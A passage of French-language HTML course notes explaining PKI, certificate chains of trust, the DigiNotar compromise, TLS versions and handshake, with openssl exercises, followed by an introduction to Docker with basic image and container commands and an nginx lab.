                    <h3>CAs de confiance :</h3>
                    <ul>
                        <li>
                            <p>Fourni avec l'OS</p>
                        </li>
                        <li>
                            <p>Mise à jour navigateur/OS</p>
                        </li>
                        <li>
                            <p>GPO/SSCM/Intune</p>
                        </li>
                    </ul>
                    <h3>Self signed (auto signé) :</h3>
                    <img src="../images/self_signed.PNG" alt="">
                    <p>Un <span class="em">certificat auto-signé</span> (self signed certificate) est un certificat que l'on <span class="em">signe soi-même</span>, sans passer par une autorité de certification.</p>
                    <p>On en rencontre souvent lors du développement d'applications pour avoir un simple <span class="em">HTTPS local</span>.</p>
                    <p>Cependant, ce type de certificat <span class="em">n'est pas reconnu comme fiable</span> car il <span class="em">n'a pas été signé par une autorité de confiance</span>.</p>
                    <p>C'est comme si quelqu'un s'écrivait lui-même une attestation en se proclamant président : <span class="em">ce n'est pas officiel</span>.</p>
                    <h3>Modèle 2 : chain of trust (confiance hiérachique) :</h3>
                    <figure>
                        <img src="../images/chain_of_trust.PNG" alt="">
                        <figcaption>Source : Medium</figcaption>
                    </figure>
                    <p>Le <span class="Em">modèle de confiance hiérarchique</span> (chain of trust) repose sur une <span class="em">chaîne d'autorités</span> :</p>
                    <p>Un certificat est signé par une autorité (CA), qui elle-même a été signée par une autre, et ainsi de suite jusqu'à la <span class="em">Root CA</span>.</p>
                    <p>On <span class="em">fait confiance</span> à un certificat parce qu'on <span class="em">fait confiance à toute la chaîne</span> qui le relie à une autorité racine reconnue.</p>
                    <p>Cependant, si un maillon de la chaîne est compromis (par exemple une <span class="em">clé privée divulguée</span>), tous les certificats <span class="em">situés en dessous perdent leur fiabilité</span>.</p>
                    <p>Si le problème touche une <span class="em">autorité intermédiaire</span>, l'impact reste <span class="em">limité</span>.</p>
                    <p>En revanche,si c'est la <span class="em">Root CA</span> qui est compromise, <span class="em">toute la hiérarchie devient invalide</span>, ce qui est <span class="em">beaucoup plus problématique</span>.</p>
                    <p>Dans ce modèle hiérarchique, chaque certificat est <span class="em">signé par l'autorité du niveau supérieur</span> :</p>
                    <ul>
                        <li>
                            <p>Le certificat du <span class="em">user</span> est signé par le <span class="em">CA de niveau L2</span>.</p>
                        </li>
                        <li>
                            <p>Celui du <span class="em">CA L2</span> est signé par le <span class="em">CA L1</span>.</p>
                        </li>
                        <li>
                            <p>Le <span class="em">CA L1</span> est signé par le <span class="em">Root CA</span>.</p>
                        </li>
                    </ul>
                    <p>Le <span class="em">Root CA</span>, lui, est un cas particulier : C'est le <span class="em">seul certificat auto-signé (self-signed)</span>, c'est-à-dire qu'il <span class="em">se signe lui-même</span>.</p>
                    <p>Malgré cela, on lui fait confiance car <span class="Em">sa clé publique est préenregistrée</span> sur nos machines ou nos navigateurs - c'est la base du <span class="em">modèle de confiance</span>.</p>
                    <p>Dans la majorité des cas, un certificat seul est insuffisant pour une validation réussie. En pratique, chaque serveur doit fournir une chaîne de certificats qui mène à une racine de confiance. Les chaînes de certificats sont utilisées pour des raisons de sécurité, techniques et administratives.</p>
                    <img src="../images/chain_of_trust_1.PNG" alt="">
                    <h3>Protéger le CA :</h3>
                    <ul>
                        <li>
                            <p>Éteindre le CA.</p>
                        </li>
                        <li>
                            <p>Les CAs intermédiaires seront chargés de signer les certificats.</p>
                        </li>
                        <li>
                            <p>Protéger la clé privée du CA.</p>
                        </li>
                        <li>
                            <p>Clé compromise rendra possible la signature de faux certificats.</p>
                        </li>
                        <li>
                            <p>Clé compromise déclenchera la révocation de nombreux certificats.</p>
                        </li>
                        <li>
                            <p>Pertes financières / faillite</p>
                        </li>
                    </ul>
                    <p>Le problème est qu'<span class="em">il n'y aurait aucun symptôme visible</span> : les navigateurs continnueraient d'afficher un cadenas vert car ils <span class="em">font confiance par défaut à la clé publique de cette autorité</span>.</p>
                    <p>C'est comparable à un <span class="em">cachet officiel volé à une commune</span> : si quelqu'un l'utilise pour fabriquer de <span class="em">faux passeports</span>, ils sembleront parfaitement authentiques car <span class="em">signés avec le vrai cachet</span>.</p>
                    <p>Résultat : <span class="em">la confiance disparaît</span> et il devient <span class="em">impossible de distinguer les vrais certificats des faux</span>.</p>
                    <h3>Clé corrompue :</h3>
                    <p>DigiNotar : Autorité de certification (CA) néerlandaise compromise en 2011. Des certificats frauduleux émis pour Google ont été utilisés dans des attaques de type "man-in-the-middle" visant les utilisateurs Gmail iraniens (2011 was bad year for Iran, Stuxnet).</p>
                    <p>Les attaquants, en possédant la clé privée, pouvaient <span class="em">chiffrer et déchiffrer</span> les communications comme un <span class="em">proxy</span> positionné entre les utilisateurs et les serveurs. Ils pouvaient ainsi <span class="em">intercepter et lire</span> tous les messages envoyés et reçus.</p>
                    <p>C'est pour cette raison que les <span class="em">CA doivent être isolés, non connectés au réseau</span>, et leurs <span class="em">clés privées strictement protégées</span>.</p>
                    <h3>Limitations :</h3>
                    <ul>
                        <li>
                            <p><span class="em">Le prix</span> : CA sont contrôlés par des entités commerciales. Le prix du certificat peut varier en fonction des attributs choisis.</p>
                        </li>
                        <li>
                            <p><span class="em">Wildcard certificate</span> (avec une étoile, par exemple *.client.com) qui permettent de couvrir plusieurs sous-domaines mais ils sont <span class="em">plus coûteux</span>.</p>
                        </li>
                        <li>
                            <p>On peut aussi définir des <span class="em">SAN</span> (Subject Alternative Names) pour qu'un seul certificat couvre <span class="em">plusieurs domaines</span> ou enregistrements DNS - cela augmente également le prix.</p>
                        </li>
                        <li>
                            <p>Let's Encrypt : solution gratuite mais limitée en terme de fonctionnalités (durée, périphériques, domaine).</p>
                        </li>
                    </ul>
                    <h3>Exercice : créer un certificat CA :</h3>
                    <ol>
                        <li>
                            <p>Générer une clé privée/publique CA :</p>
<pre><code>openssl genrsa -out ca.key 2048</code></pre>
                            <p>Cette commande génère une clé RSA de 2048 bits et l'écrit dans `<span class="em">ca.key</span>`.</p>
                        </li>
                        <li>
                            <p>Générer un certificat CA :</p>
<pre><code>openssl req -x509 -new -nodes -key ca.key -sha256 -days 1825 -out ca.cert -subj "/C=BE/CN=ca.com"</code></pre>
                            <p>Cette commande crée un certificat auto-signé (<span class="em">-x509</span>) et une clé privée (si `<span class="em">ca.key</span>` indique d'utiliser/écrire cette clé).</p>
                            <p>L'option <span class="em">-new -nodes</span> crée un nouvel objet sans chiffrage de la clé (pas passphrase).</p>
                        </li>
                    </ol>
                    <h3>TLS : définition :</h3>
                    <p>Le chiffrage asymétrique est une solution idéale pour identifier un acteur sur le réseau.</p>
                    <p>Toutefois, le chiffrage asymétrique <span class="em">est lent à l'exécution</span> en raison de la charge de calcul élevée.</p>
                    <p>TLS utilise <span class="em">à la fois un chiffrement asymétrique et symétrique</span> pour protéger la confidentialité et l'intégrité des données en transit. Le <span class="em">chiffrement asymétrique est utilisé pour établir une session sécurisée</span> entre une client et un serveur, et le <span class="em">chiffrement symétrique est utilisé pour échanger des données</span> au sein de la session sécurisée.</p>
                    <p>En plus de chiffrer les données transmises entre un serveur et votre navigateur, le protocole <span class="em">TLS (PKI) authentifie également le serveur auquel vous vous connectez</span> et protège les données transmises de toute altération.</p>
                    <p class="em">En d'autres termes, le rôle de TLS est de partager une clé symétrique en utilisant une clé asymétrique.</p>
                    <h4>Versions :</h4>
                    <img src="../images/TLS_versions.PNG" alt="">
                    <ul>
                        <li>
                            <p>Secure Socket Layer / Transport Layer Security.</p>
                        </li>
                        <li>
                            <p>SSL 1.0, 2.0, 3.0 étaient propriétaire de Netscape.</p>
                        </li>
                        <li>
                            <p>IETF est en charge du protocole TLS.</p>
                        </li>
                        <li>
                            <p>TLS 1.0 (3.1) basé sur SSL 3.0.</p>
                        </li>
                        <li>
                            <P>TLS 1.0 et 1.1 sont obsolètes depuis 2021 (plus supporté par les principaux acteurs du web).</P>
                        </li>
                        <li>
                            <p>TLS 1.3 réduit le nombre de message durant la communication.</p>
                        </li>
                    </ul>
                    <p>Aujourd'hui, on parle de <span class="em">TLS</span> alors qu'il y a quelques années on parlait de <span class="em">SSL</span>.</p>
                    <p>TLS est en fait <span class="em">la suite logique</span> de SSL.</p>
                    <p>Le protocole <span class="em">SSL n'existe plus</span>. Il a été remplacé et standardisé par l'<span class="em">IETF</span> sous le nom de <span class="em">TLS</span>.</p>
                    <h4>TLS support :</h4>
                    <img src="../images/TLS_support.PNG" alt="">
                    <p>En <span class="em">2012</span>, on observait encore une <span class="em">forte utilisation de SSL</span> et très peu de TLS.</p>
                    <p>Mais à partir de <span class="em">2014</span>, après la découverte d'une <span class="em">faille de sécurité sur SSL v3 (attaque POODLE)</span>, il y a eu une <span class="em">migration massive vers TLS</span>.</p>
                    <p>En général, les migrations ne se font <span class="em">qu'après la découverte d'une faille</span>, rarement avant.</p>
                    <h4>TLS support aujourd'hui :</h4>
                    <figure>
                        <img src="../images/TLS_support_ajd.PNG" alt="">
                        <figcaption>Source : sslabs 09/2022</figcaption>
                    </figure>
                    <p>Aujourd'hui, même si <span class="em">TLS 1.3</span> existe, <span class="em">beaucoup d'utilisateurs restent encore sur TLS 1.2</span>.</p>
                    <h3>TLS handshake (1.2) :</h3>
                    <div>
                        <img src="../images/TLS_handshake.PNG" alt="" class="float_right">
                        <ul>
                            <li>
                                <p>Client hello : max TLS <span class="em">(Downgrade  attack)</span>, cipher suites, chiffre aléatoire</p>
                            </li>
                            <li>
                                <p>Server hello : TLS version, cipher suite, chiffre aléatoire.</p>
                            </li>
                            <li>
                                <p>Certificate : clé pub, signature, auth (PKI).</p>
                            </li>
                            <li>
                                <p>Server hello done : fin étape.</p>
                            </li>
                            <li>
                                <p>Client Key exchange : clé "pre-master" envoyé au serveur, protocole (RSA, ECDHE). Le client et le serveur calculent la clé "master" sur base des chiffres aléatoires + clé "pre-master".</p>
                            </li>
                            <li>
                                <p>Change cipher spec : prêt à faire du chiffrement symétrique (spécifié dans le "cipher suite").</p>
                            </li>
                        </ul>
                    </div>
                    <h3>Cipher suite (suite de chiffrement) :</h3>
                    <p>Le "chipher suite" est un ensemble d'algorithmes utilisé lors d'une communication TLS. Il contient les informations suivantes :</p>
                    <ul>
                        <li>
                            <p>Protocole : TLS1.2, TLS1.3, etc.</p>
                        </li>
                        <li>
                            <p>Algorithmes d'échange de clé (key exchange) : L'algorithme d'échange de clé est utilisé pour échanger une clé entre deux tiers (ex : ECDHE, RSA (valeur par défaut)).</p>
                        </li>
                        <li>
                            <p>Authentification : (ex: RSA (valeur par défaut), ECDSA).</p>
                        </li>
                        <li>
                            <p>Algorithmes de chiffrement des données (bulk encryption algorithm) : Ces algorithmes sont utilisés pour chiffrer les données (applicatives) envoyées.</p>
                        </li>
                        <li>
                            <p>Message Authentication Code (MAC) : Les fonctions de hachage utilisées (ex : SHA, MD5).</p>
                        </li>
                        <li>
                            <p>Exemple : DHE_RSA_AES256_SHA256.</p>
                        </li>
                    </ul>
                    <h3>TCP/IP :</h3>
                    <p class="em">À quel niveau de la pile TCP/IP se déroule le TLS handshake ?</p>
                    <figure>
                        <img src="../images/TCP_IP.PNG" alt="">
                        <figcaption>Source : hpbn</figcaption>
                    </figure>
                    <p>Le TLS handshake, ça se passe au niveau transport.</p>
                    <p>Le TCP va faire quoi ? Il va commencer à faire son TCP handshake, ils vont commencer à discuter, se synchroniser, et après TLS arrive.</p>
                    <p>Donc il faut d'abord qu'il y ait cette liaison faite au niveau TCP, et ensuite TLS vient sécuriser la communication.</p>
                    <h3>Reverse proxy : TLS offloading :</h3>
                    <div>
                        <figure class="float_right">
                            <img src="../images/TLS_offloading.PNG" alt="">
                            <figcaption>Source : sectigostore</figcaption>
                        </figure>
                        <ul>
                            <li>
                                <p>Migration vers HTTPS.</p>
                            </li>
                            <li>
                                <p>Coût du certificat (exposé qu'un seul point d'accès).</p>
                            </li>
                        </ul>
                    </div>
                    <h3>HTTPS :</h3>
                    <img src="../images/HTTPS.PNG" alt="">
                    <p>Sur ce schéma, on voit l'évolution des versions du protocole <span class="em">HTTP</span>.</p>
                    <ul>
                        <li>
                            <p>En <span class="em">HTTP/1.1</span>, le <span class="em">TLS</span> est <span class="em">optionnel</span> : la communication peut se faire en <span class="em">HTTP</span> (non sécurisé) ou en <span class="em"> HTTPS</span> (sécurisé).</p>
                        </li>
                        <li>
                            <p>En <span class="em">HTTP/2</span>, le <span class="em">TLS</span> devient <span class="em">obligatoire</span>. Toutes les communications passent par une connexion <span class="em">sécurisée</span>.</p>
                        </li>
                        <li>
                            <p>En <span class="em">HTTP/3</span>, le protocole change de base : il n'utilise plus <span class="em">TCP</span>, mais <span class="em">QUIC</span> qui repose sur <span class="em">UDP</span> avec le <span class="em">TLS</span> intégré nativement.</p>
                        </li>
                    </ul>
                    <p>Ce qu'il faut retenir est que HTTP est le <span class="em">protocole de communication</span> entre le client et le serveur tandis que <span class="em">HTML</span> est un <span class="em">langage de description</span> du contenu d'une page web, c'est-à-dire HTTP transporte les données et HTML décrit la structure de ces données.</p>
                    <h3>Navigateur : Expiration de certificat :</h3>
                    <p>Depuis le 1<sup>er</sup> septembre 2020, la date d'expiration maximale des certificats TLS passera de 2 ans à 13 mois.</p>
                    <ul>
                        <li>
                            <p>Découverte de failles dans les algorithmes de chiffrement (migration rapide).</p>
                        </li>
                        <li>
                            <p>Validation des informations du certificat.</p>
                        </li>
                        <li>
                            <p>Révoquer plus rapidement un certificat.</p>
                        </li>
                    </ul>
                    <h3>Exercice : Signer une CSR avec une clé CA :</h3>
                    <ol>
                        <li>
                            <p>Signer une CSR :</p>
<pre><code>openssl x509 -req -in client.csr -CA CA.cer -CAkey ca.key -CAcreateserial -out client.crt</code></pre>
                            <p>Cette commande prend une CSR, `<span class="em">client.csr</span>`, et la signe avec la clé CA (<span class="em">-CAkey ca.key</span>) pour produire le certificat client, `<span class="em">client.crt</span>`.</p>
                            <p>Grâce à l'option <span class="em">-CAcreateserial</span>, si aucun fichier `<span class="em">CA.srl</span>` (fichier de numéro de série) n'existe, OpenSSL le crée et y stocke le prochain numéro de série.</p>
                        </li>
                        <li>
                            <p>Créer un PFX :</p>
<pre><code>openssl pkcs12 -export -out client.pfx -inkey client.key -in client.cer -certfile CA.cer</code></pre>
                            <p>Cette commande crée un fichier PFCS#12, `<span class="em">client.pfx</span>`, contenant la clé privée (<span class="em">-inkey client.key</span>) et le certificat du client (<span class="em">-in client.cer</span>). Elle ajoute en plus le CA (<span class="em">-certfile CA.cer</span>) ou la chaîne intermédiaire dans le PFCS#12.</p>
                            <p>À l'exécution, OpenSSL te demandera un mot de passe pour protéger le <span class="em">.pfx</span>.</p>
                        </li>
                    </ol>
                    <h3>Récapitulatif : exemple de questions d'examen :</h3>
                    <ul>
                        <li>
                            <p>Quels sont les deux types de chiffrement utilisés durant le TLS handshake ?</p>
                            <p class="em">Asymétrique pour échanger la clé secrète + symétrique pour ciffrer la session.</p>
                        </li>
                        <li>
                            <p>Quelle est la différence entre cryptographie symétrique et asymétrique ?</p>
                            <p class="em">Symétrique : même clé pour chiffrer/déchiffrer.</p>
                            <p class="em">Asymétrique : clé publique / clé privée distinctes.</p>
                        </li>
                        <li>
                            <p>Qu'offre PKI ?</p>
                            <p class="em">Une infrastructure de confiance : gestion, délivrance et révocation des certificats numériques.</p>
                        </li>
                        <li>
                            <p>Comment vérifier la validité d'un certificat ?</p>
                            <p class="em">En vérifiant :</p>
                            <ul class="em">
                                <li>
                                    <p>sa date de validité,</p>
                                </li>
                                <li>
                                    <p>la chaîne de certification,</p>
                                </li>
                                <li>
                                    <p>et les listes de révocation (CRL ou OCSP).</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Qu'est-ce que la "downgrade attack" ?</p>
                            <p class="em">Une attaque où l'adversaire force deux parties à utiliser une version ou un algorithme plus faible pour exploiter une faille connue.</p>
                        </li>
                    </ul>
                <article>
                    <h2 id="Docker">Docker :</h2>
                    <p>Pour cette partie du cours, vous devez installer <a href="https://docs.docker.com/desktop/" target="_blank">Docker Desktop</a> car, sur Windows et Mac OS, Docker ne peut pas tourner nativement contrairement à Linux.</p>
                    <p>Docker Desktop fournit :</p>
                    <ul>
                        <li>
                            <p>une <span class="em">VM Linux</span> où s'exécutent les conteneurs,</p>
                        </li>
                        <li>
                            <p>le <span class="em">daemon Docker</span> (<span class="em">dockerd</span>),</p>
                        </li>
                        <li>
                            <p>l'interface graphique (facultative).</p>
                        </li>
                    </ul>
                    <div class="important">
                        <img src="../images/important.png" alt="Important" class="float_left">
                        <p>Sur Windows et Mac OS, les commandes <span class="em">docker</span> du terminal ne fonctionnent pas si Docker Desktop n'est pas lancé.</p>
                        <p>La commande <span class="em">docker</span> dans le terminal est juste un <span class="em">client</span> qui communique avec le daemon Docker.</p>
                        <p>&#8594; Si Docker Desktop n'est pas lancé &#8594; le daemon n'est pas lancé &#8594; le client ne peut joindre aucun serveur &#8594; les commandes échouent.</p>
                    </div>
                    <p>Sur Linux, Docker fonctionne nativement, c'est-à-dire <span class="em">pas besoin de Docker Desktop</span>, il suffit que le service Docker tourne :</p>
<pre><code>sudo systemctl start docker</code></pre>
                    <h3>Introduction :</h3>
                    <p>Les containers sont des paquets logiciels légers et autonomes qui incluent tout ce dont vous avez besoin pour exécuter une application :</p>
                    <ul>
                        <li>
                            <p>le code</p>
                        </li>
                        <li>
                            <p>le runtime</p>
                        </li>
                        <li>
                            <p>les outils système</p>
                        </li>
                        <li>
                            <p>etc.</p>
                        </li>
                    </ul>
                    <p>Ils fournissent un environnement cohérent sur différents systèmes, garantissant que l'application se comporte de la même manière, quel que soit l'endroit où elle est déployée.</p>
                    <h3>Sans Docker : Web :</h3>
                    <div>
                        <img src="../images/without_docker_web.PNG" alt="" class="float_right">
                        <ul>
                            <li>
                                <p>Documentation incomplète ou incohérente</p>
                            </li>
                            <li>
                                <p>Écarts environnementaux</p>
                            </li>
                            <li>
                                <p>Gestion des dépendances</p>
                            </li>
                            <li>
                                <p>Lacunes de communication entre les développeurs et les opérateurs</p>
                            </li>
                        </ul>
                    </div>
                    <h3>Docker : Web :</h3>
                    <div>
                        <img src="../images/docker_web.PNG" alt="" class="float_right">
                        <ul>
                            <li>
                                <p>Documentation cohérente et reproductible</p>
                            </li>
                            <li>
                                <p>Élimine les divergences environnementales</p>
                            </li>
                            <li>
                                <p>Gestion simplifiée des dépendances</p>
                            </li>
                            <li>
                                <p>Collaboration améliorée entre les développeurs et les opérations</p>
                            </li>
                        </ul>
                    </div>
                    <h3>Quels sont les avantages d'utiliser des conteneurs ?</h3>
                    <h4>Avantages spécifiques au rôle de la conteneurisation :</h4>
                    <p>Développeur :</p>
                    <ul>
                        <li>
                            <p>Cohérence entre les environnements : garantit que l'application fonctionne de la même manière à toutes les étapes (développement, tests, production).</p>
                        </li>
                        <li>
                            <p>Gestion facile des dépendances : regroupe les dépendances dans des conteneurs, évitant ainsi les conflits de versions.</p>
                        </li>
                        <li>
                            <p>Architecture de microservices : facilite la conception modulaire en permettant à chaque service de s'exécuter dans son propre conteneur.</p>
                        </li>
                    </ul>
                    <p>Ingénieurs de sécurité :</p>
                    <ul>
                        <li>
                            <p>Environnements de test isolés : exécutez en toute sécurité des tests et des applications vulnérables sans affecter le système hôte.</p>
                        </li>
                        <li>
                            <p>Reproductibilité des tests : partagez et reproduisez facilement des configurations de tests exactes à l'aide d'images de conteneurs.</p>
                        </li>
                    </ul>
                    <h4>Avantages des conteneurs :</h4>
                    <ul>
                        <li>
                            <p>Cohérence de l'environnement : <q>Cela fonctionne sur ma machine</q> signifie souvent des dépendances manquantes.</p>
                        </li>
                        <li>
                            <p>Type de package : les formats varient : par exemple, Java utilise des JAR, .NET utilise des EXE.</p>
                        </li>
                        <li>
                            <p>Gestion des dépendances : des versions de dépendances conflictuelles peuvent entraîner des problèmes entre les applications.</p>
                        </li>
                        <li>
                            <p>Efficacité des ressources : les machines virtuelles sont lourdes puisque chacune inclut un système d'exploitation complet.</p>
                        </li>
                        <li>
                            <p>Évolutivité et déploiement : l'ajout d'un conteneur est plus rapide que le provisionnement d'une nouvelle machine.</p>
                        </li>
                        <li>
                            <p>Isolation et sécurité : les applications sur l'hôte peuvent interférer les unes avec les autres; les conteneurs isolent les processus, réduisant ainsi les risques.</p>
                        </li>
                        <li>
                            <p>Portabilité : les applications liées à des environnements spécifiques sont difficiles à déplacer; les conteneurs standardisent l'emballage, facilitant ainsi les transferts entre les systèmes.</p>
                        </li>
                        <li>
                            <p>Modernisation héritée : les conteneurs permettent aux applications héritées de s'exécuter sur une infrastructure moderne sans modifications majeures du code.</p>
                        </li>
                        <li>
                            <p>Productivité du développement : les conteneurs rationalisent la configuration de l'environnement de développement, reflétant fidèlement les paramètres de production.</p>
                        </li>
                    </ul>
                    <h3>Comment ça marche : Linux :</h3>
                    <p>Les conteneurs sous Linux utilisent des fonctionnalités clés telles que les espaces de noms, les groupes de contrôle et les systèmes de fichiers union pour l'isolation et le contrôle des ressources :</p>
                    <ul>
                        <li>
                            <p>Les espaces de noms assurent l'isolation en séparant les processus, les interfaces réseau et les systèmes de fichiers, de sorte que chaque conteneur semble avoir son propre environnement.</p>
                        </li>
                        <li>
                            <p>Les Cgroups (groupes de contrôle) gèrent et limitent l'utilisation des ressources (CPU, mémoire, etc.) des conteneurs pour éviter que l'un d'entre eux ne consomme toutes les ressources. Ces fonctionnalités permettent aux conteneurs de fonctionner de manière sécurisée et efficace sans interférer les uns avec les autres.</p>
                        </li>
                        <li>
                            <p>Les systèmes de fichiers union (par exemple, OverlayFS) permettent aux conteneurs de partager des fichiers et des couches communs tout en conservant leurs propres modifications séparément. Cela rend les conteneurs légers et efficaces en réutilisant les couches entre les conteneurs, réduisant ainsi l'utilisation de l'espace disque.</p>
                        </li>
                    </ul>
                    <h3>Comment ça marche : Windows :</h3>
                    <p>Sous Windows, les conteneurs sont gérés via des conteneurs Windows Server ou des conteneurs Hyper-V :</p>
                    <ul>
                        <li>
                            <p>Les conteneurs Windows Server utilisent des techniques d'isolation similaires à celles de Linux, en séparant les processus, les fichiers et les entrées de registre.</p>
                        </li>
                        <li>
                            <p>Les conteneurs Hyper-V offrent une isolation supplémentaire en exécutant chaque conteneur dans une machine virtuelle légère, améliorant ainsi la sécurité. Les deux systèmes garantissent l'isolation des processus et une utilisation efficace des ressources, mais Windows exploite également sa virtualisation Hyper-V pour une sécurité plus stricte si nécessaire.</p>
                        </li>
                    </ul>
                    <h3>VM vs Container :</h3>
                    <img src="../images/VM_VS_Docker.PNG" alt="">
                    <p>Les conteneurs remplaceront-ils les machines virtuelles ?</p>
                    <h3>VM et conteneur :</h3>
                    <p>Non, ils répondent à des objectifs différents et peuvent coexister, car chacun a ses propres atouts et cas d'utilisation.</p>
                    <img src="../images/VM_Container.PNG" alt="">
                    <h3>Moteur (Engine) VS CLI :</h3>
                    <p>Moteur (Engine) :</p>
                    <ul>
                        <li>
                            <p>Composant principal du moteur de conteneur : le moteur de conteneur est le moteur d'exécution principal chargé de gérer le cycle de vie des conteneurs. Il gère des tâches telles que la création, le démarrage, l'arrêt et la suppression de conteneurs.</p>
                        </li>
                        <li>
                            <p>Gère les conteneurs et les images : le moteur extrait les images de conteneurs, les exécute en tant que conteneurs et gère leur état. Il gère également des tâches de bas niveau telles que la mise en réseau, le stockage et l'allocation de ressources pour les conteneurs.</p>
                        </li>
                        <li>
                            <p>Ex : docker, conteneur</p>
                        </li>
                    </ul>
                    <p>CLI :</p>
                    <ul>
                        <li>
                            <p>Outil d'interaction utilisateur : la CLI est un outil qui permet aux utilisateurs d'interagir avec le moteur de conteneur via des commandes en ligne de commandes. Il envoie des commandes au moteur qui les exécute ensuite.</p>
                        </li>
                        <li>
                            <p>Simplifie la gestion des conteneurs : les utilisateurs peuvent effectuer des tâches telles que la création d'images, l'exécution de conteneurs, la gestion de réseaux et la gestion de volume via des commandes simples (par exemple, <span class="em">docker build</span>, <span class="em">docker run</span>, <span class="em">docker ps</span>).</p>
                        </li>
                        <li>
                            <p>Ex : docker, podman</p>
                        </li>
                    </ul>
                    <h3>Commandes de base :</h3>
                    <h4>Images Docker :</h4>
                    <p>La commande <span class="em">docker images</span> répertorie toutes les images Docker sur votre système local. Par défaut, il affiche des colonnes telles que le référentiel (repository), la balise (tag), l'ID de l'image, la date de création et la taille.</p>
                    <p>Le commutateur le plus couramment utilisé est <span class="em">-a</span> ou <span class="em">--all</span>, qui affiche toutes les images, y compris les images intermédiaires qui sont généralement masquées dans la sortie par défaut. Cela peut être utile pour nettoyer les images inutilisées ou pour le débogage.</p>
                    <p>Ex : <span class="em">docker images -a</span></p>
                    <ul>
                        <li>
                            <p>Référentiel (repository) : le nom de la source de l'image, généralement un registre Docker (par exemple, Docker Hub ou un registre privé).</p>
                        </li>
                        <li>
                            <p>Balise (tag) : une étiquette qui différencie les versions de l'image (par exemple, la dernière, v1.0).</p>
                        </li>
                        <li>
                            <p>ID d'image : un identifiant unique pour l'image (dans un format de hachage).</p>
                        </li>
                        <li>
                            <p>Créé : la date et l'heure auxquelles l'image a été créée.</p>
                        </li>
                        <li>
                            <p>Taille : La taille de l'image stockée.</p>
                        </li>
                    </ul>
                    <h3>Extraction du docker :</h3>
                    <p>La commande <span class="em">docker pull</span> est utilisée pour télécharger des images Docker depuis un registre vers votre ordinateur local. Il récupère l'image spécifiée dans la commande et la rend disponible pour une utilisation dans les conteneurs Docker.</p>
                    <p>Ex : <span class="em">docker pull ubuntu:latest</span> (si vous omettez le tag, Docker utilise par défaut la dernière).</p>
                    <h3>D'où viennent les images ?</h3>
                    <h4>Registres Docker :</h4>
                    <p>Un registre Docker est un service qui stocke et gère les images Docker, facilitant l'organisation et le déploiement d'applications conteneurisées.</p>
                    <p>Docker Hub est le plus grand repository cloud d'images de conteneurs fourni par Docker. Il fournit plus de 100000 images pouvant être utilisées et créées par des projets open source, des éditeurs de logiciels et la communauté Docker.</p>
                    <p>La plateforme vous permet de diffuser rapidement vos applications n'importe où, de collaborer avec vos coéquipiers et d'automatiser les builds pour une intégration plus rapide à un pipeline de développement.</p>
                    <p>URL : <a href="https://hub.docker.com/" target="_blank">https://hub.docker.com/</a></p>
                    <h3>Laboratoire :</h3>
                    <ul>
                        <li>
                            <p>Extraire l'image Docker nommée nginx.</p>
<pre><code>docker pull nginx</code></pre>
                        </li>
                        <li>
                            <p>Vérifier l'ID de l'image (<span class="em">docker inspect nginx:latest | grep _VERSION</span>).</p>
<pre><code>docker images -a</code></pre>
                        </li>
                        <li>
                            <p>Extraire l'image Docker nommée nginx et étiquetée 1.29.2.</p>
<pre><code>docker pull nginx:1.29.2</code></pre>
                        </li>
                        <li>
                            <p>Vérifier l'identifiant de l'image.</p>
<pre><code>docker images --all</code></pre>
                        </li>
                        <li>
                            <p>Extraire l'image Docker nommée nginx et étiquetée 1.29.1.</p>
<pre><code>docker pull nginx:1.29.1</code></pre>
                        </li>
                        <li>
                            <p>Vérifier l'identifiant de l'image.</p>
<pre><code>docker images -a</code></pre>
                        </li>
                        <li>
                            <p>Qu'est-ce que cela signifie ?</p>
                            <p class="em">Cela signifie que la version 1.29.2 a le même identifiant que la version :latest.</p>
                        </li>
                        <li>
                            <p>Supprimer des images (<span class="em">docker rmi x</span>).</p>
<pre><code>docker rmi nginx:1.29.1</code></pre>
<pre><code>docker rmi nginx:1.29.2</code></pre>
<pre><code>docker rmi nginx:latest</code></pre>
                        </li>
                    </ul>
                    <h3>Dernier modèle : anti pattern :</h3>
                    <p>Le dernier tag dans Docker fait référence au tag par défaut qui est appliqué à une image si aucun tag spécifique n'est fournie lors des commandes <span class="em">docker pull</span>, <span class="em">docker run</span> ou <span class="em">docker build</span>. Il s'agit pas d'un tag spécial ou magique, mais simplement d'un tag conventionnel utilisé pour pointer vers une version particulière d'une image.</p>
                    <ul>
                        <li>
<pre><code>docker pull ubuntu</code></pre>
                        </li>
                        <li>
<pre><code>docker pull ubuntu:latest</code></pre>
                        </li>
                    </ul>
                    <p>Le tag <span class="em">:latest</span> ne pointe pas nécessairement vers la version la plus récente d'une image. Il s'agit simplement d'un tag par défaut appliqué aux images qui n'ont pas de tag spécifié. Ces deux commandes créeront une nouvelle image et la marqueront comme <span class="em">:latest</span>.</p>
                    <p>Si vous <span class="em">push</span> une nouvelle image avec un tag qui n'est ni vide ni "latest", <span class="em">:latest</span> ne sera ni affecté ni créé.</p>
                    <h3>Image VS conteneur :</h3>
                    <p>Les images Docker sont des templates utilisés pour créer des conteneurs.</p>
                    <p>Comme les instantanés (snapshots) pour les machines virtuelles, les images Docker sont des fichiers immuables en lecture seule qui comprennent le code source, les bibliothèques, les dépendances, les outils et tout autre fichier nécessaire à l'exécution d'une application.</p>
                    <p>Chaque image est créée à partir d'un Dockerfile, qui contient des instructions spécifiques pour créer une image Docker particulière. Les conteneurs d'état ont deux états : au repos et en cours d'exécution.</p>
                    <ul>
                        <li>
                            <p>Au repos : le conteneur existe sous la forme d'une image : un template immuable en lecture seule stocké sous forme de fichiers de configuration et de couches de système de fichiers.</p>
                        </li>
                        <li>
                            <p>En cours d'exécution : l'image devient un conteneur : une instance active et exécutable avec des processus en cours d'exécution et une couche inscriptible au-dessus des couches d'image en lecture seule.</p>
                        </li>
                    </ul>
                    <h3>docker create :</h3>
                    <p>La commande <span class="em">docker create</span> permet de créer un nouveau conteneur à partir d'une image Docker spécifique (sans la démarrer).</p>
<pre><code>docker create --name proxy-reverse nginx</code></pre>
                    <h3>docker start :</h3>
                    <p>La commande <span class="em">docker start</span> est utilisée pour démarrer un ou plusieurs conteneurs arrêtés précédemment créés.</p>
<pre><code>docker start id/name</code></pre>
                    <h3>docker ps :</h3>
                    <p>La commande <span class="em">docker ps</span> est utilisée pour répertorier les conteneurs actuellement en cours d'exécution sur votre hôte Docker. Il fournit des informations sur chaque conteneur en cours d'exécution, notamment son ID, son nom, son statut, etc.</p>
                    <ul>
                        <li>
